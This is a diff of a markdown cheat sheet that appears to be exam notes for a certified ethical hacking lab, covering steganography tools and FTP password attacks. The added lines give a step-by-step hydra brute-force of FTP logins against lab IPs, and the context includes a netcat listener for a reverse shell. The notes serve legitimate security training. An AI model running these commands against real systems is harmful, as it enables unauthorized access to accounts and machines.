@@ -38,8 +38,8 @@ If even this the above command is not working then use this command-->  namp -f 
 2. To Display Hidden Data- snow -C -p "magic" readme2.txt (then it will show the content of readme2.txt content)
 3. Image Stegnography using Openstego or stegonline
 Open Openstego > Select input file .png, .jpg > Select Output file > Give password if required or
-stegonline > upload the file and type password
-```
+stegonline > upload the file > Extract file/data > select R, G, B in row 5 > click on go > Here is result.
+
 # Cryptography 
 ```
 1. VERACRYPT
@@ -66,7 +66,15 @@ Use [Crack Station](https://crackstation.net/) or [Hashes.com](https://hashes.co
 Then go to Desktop and in Ceh tools folder you will find wordlists, here you will find usernames and passwords file.
 Now in terminal type-  hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://10.10.10.10
 
-hydra -l user -P passlist.txt ftp://10.10.10.10
+hydra -l user -P passlist.txt ftp://10.10.10.10 (if username is known)
+
+4. Crack FTP
+nmap -A -p 21 ip (Find os running)
+sudo su (become root)
+hydra -L user.txt -P pass.txt ftp://ip
+ftp ip
+and type: username and password
+Now access the machine
 ```
 #  Hacking Web Application
 ```
@@ -216,11 +224,6 @@ nc -lnvp 4444 [type this in attacker's machine]
 ls
 find . -name file.txt
 cat /path/file.txt
-
-FTP:
-nmap -A -p 21 ip
-hydra -L user.txt -P pass.txt ftp://ip
-ftp ip and type: username and password
 
 DVWA:
 ZAP
